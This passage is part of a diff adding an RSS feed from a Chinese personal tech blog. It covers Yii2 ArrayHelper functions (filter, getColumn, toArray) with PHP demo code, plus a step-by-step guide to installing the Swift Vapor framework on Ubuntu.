+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;age&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#b452cd&#34;&gt;17&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;course&amp;#39;&lt;/span&gt; =&amp;gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;one&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;english&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;two&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;chinese&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;three&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;math&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$result&lt;/span&gt; = \yii\helpers\ArrayHelper::&lt;span style=&#34;color:#658b00&#34;&gt;filter&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;!name&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;course.one&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;!course.three&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$result&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面这个 demo 里，使用该筛选函数，排除了一维的 name ，显示了一维的 sex ，显示二维的 course 中的 one ，排除了二维的 course 中的 three，最后的结果为下图。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-03-17_00-02-32.png&#34; alt=&#34;运行结果&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;二数组检索列yiihelperarrayhelpergetcolumn&#34;&gt;二、数组检索列（\yii\helper\ArrayHelper::getColumn）&lt;/h2&gt;
+&lt;p&gt;其实这个函数的话在官方文档内也说明的挺清楚的，&lt;a href=&#34;https://www.yiiframework.com/doc/guide/2.0/zh-cn/helper-array#retrieving-columns&#34;&gt;点击前往&lt;/a&gt;，但是在这里的话，我是对文档内指定一个匿名函数的补充，因为官方文档内示例是只检索出单独一个值，而这里的话是可以返回出一个新的数组结构。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;actionExample&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;jack&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;man&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;age&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#b452cd&#34;&gt;17&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;james&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;man&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;age&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#b452cd&#34;&gt;19&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;jones&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;man&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;age&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#b452cd&#34;&gt;16&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#00688b&#34;&gt;$result&lt;/span&gt; = \yii\helpers\ArrayHelper::&lt;span style=&#34;color:#658b00&#34;&gt;getColumn&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$element&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        	&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;student&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#00688b&#34;&gt;$element&lt;/span&gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;gender&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#00688b&#34;&gt;$element&lt;/span&gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt;]];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$result&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面这个 demo 里，使用了检索列函数，同时用匿名函数来为数组的每一项返回新的结构，使用 student 来显示原先的 name，gender 显示原先的 sex，最后结果为下图。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-03-17_00-33-40.png&#34; alt=&#34;运行结果&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;二对象转化为数组yiihelperarrayhelpertoarray&#34;&gt;二、对象转化为数组（\yii\helper\ArrayHelper::toArray）&lt;/h2&gt;
+&lt;p&gt;有时候我们通过&lt;em&gt;Active Record&lt;/em&gt;查询出的数据并不满足前端需求，或者某些字段需要其他字段进行聚合运算；可能好多开发者的第一反应是对结果集转化为数组后进行遍历操作，这样一方面代码不够整洁，另一方面进行遍历操作如果存在其他表查询就会带来N+1的问题，所以使用&lt;em&gt;toArray&lt;/em&gt;这个方法来处理我们的需求。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;use&lt;/span&gt; yii\helpers\ArrayHelper;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;use&lt;/span&gt; app\models\Example;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;//其他伪代码....
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$data&lt;/span&gt; = ArrayHelper::&lt;span style=&#34;color:#658b00&#34;&gt;toArray&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#00688b&#34;&gt;$list&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                Example::&lt;span style=&#34;color:#658b00&#34;&gt;className&lt;/span&gt;() =&amp;gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;article_top&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;article&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;question_list&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#00688b&#34;&gt;$item&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;$item&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getQuestion&lt;/span&gt;()-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;all&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的伪代码中，&lt;code&gt;$list&lt;/code&gt;为模型查询出来的数据（对象）；转化为数组时需要先指定目标的模型，指定模型后，如果需要返回原先模型的字段，则直接对应名称即可；如果需要定义返回内容的话，则需要编写对应的返回名称和执行计算的闭包函数，闭包函数的参数是查询的&lt;em&gt;Active Record&lt;/em&gt;对象，基于它可以进行模型关联等其他操作。&lt;/p&gt;
+- https://jadenhsiao.gitee.io/post/yii2-skills-part-one/ - Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Ubuntu 安装 Vapor</title>
+        <link>https://jadenhsiao.gitee.io/post/ubuntu-install-vapor/</link>
+        <pubDate>Tue, 31 Aug 2021 22:38:28 +0800</pubDate>
+        
+        <guid>https://jadenhsiao.gitee.io/post/ubuntu-install-vapor/</guid>
+        <description>JadenHsiao https://jadenhsiao.gitee.io/post/ubuntu-install-vapor/ -&lt;blockquote&gt;
+&lt;p&gt;Apple 公司的 Swift 不仅能够编写 MacOS 、IOS 端的应用，还能基于 SwiftNIO 编写服务端，在 Swift 服务端的阵营里，有 Kitura、perfect、Vapor 。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;而今天，我将给大家介绍一款服务端框架 &lt;a href=&#34;https://vapor.codes&#34;&gt;Vapor&lt;/a&gt;，他在 &lt;a href=&#34;https://github.com/vapor/vapor&#34;&gt;github&lt;/a&gt; 收获高达 20.6k star 的服务端框架，同时支持 JWT、MySQL、Redis、MongoDB种种我们服务端开发所需要的组件，并且设计思路来源于 Laravel/Lumen（php开发者狂喜😆😆），同时拥有活跃的社区，并且随着 Swift 版本在不断地更新，所以，我毅然决然选择 Vapor 作为我 Swift 开发服务端的框架。&lt;/p&gt;
+&lt;p&gt;因为我的 MacOS 系统版本是 Majove，同时平常更加倾向于使用 Windows，所以就选择了 WSL 作为 Vapor 的开发环境，使用的是 Ubuntu18.04，接下来，将先介绍下在 Ubuntu 下如何安装 Vapor。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2021-08-31_11-56-18.jpg&#34; alt=&#34;下载 Vapor 源码&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;到 Vapor 的 github 项目主页上下载源码；&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2021-08-31_11-59-59.jpg&#34; alt=&#34;编译源码&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;进入到 toolbox，执行 &lt;code&gt;swift build -c release --disable-sandbox --enable-test-discovery&lt;/code&gt;进行源码编译，在执行 &lt;code&gt;mv .build/release/vapor /usr/local/bin&lt;/code&gt; 移动到执行目录；&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2021-08-31_12-41-01.jpg&#34; alt=&#34;校验是否安装完成&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;执行 &lt;code&gt;vapor --help&lt;/code&gt;，如和上图所示，即为安装完成；&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2021-08-31_12-50-02.jpg&#34; alt=&#34;创建项目&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;执行 &lt;code&gt;vapor new hello -n&lt;/code&gt;，创建第一个 Vapor 项目，看到如此大的水蒸气图案💧，就证明创建完成了；&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2021-08-31_12-55-35.jpg&#34; alt=&#34;编译项目&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;执行 &lt;code&gt;swift build&lt;/code&gt;，编译 Vapor 项目文件；&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2021-08-31_12-55-56.jpg&#34; alt=&#34;启动项目&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;6&#34;&gt;
+&lt;li&gt;启动项目，这时候看到命令行提示使用 127.0.0.1:8080 进行访问。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;打开浏览器，访问 127.0.0.1:8080，就可以看到第一个路由的返回结果，“It work”了😀。&lt;/p&gt;
+- https://jadenhsiao.gitee.io/post/ubuntu-install-vapor/ - Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
+    
+    
+  </channel>
+</rss> 
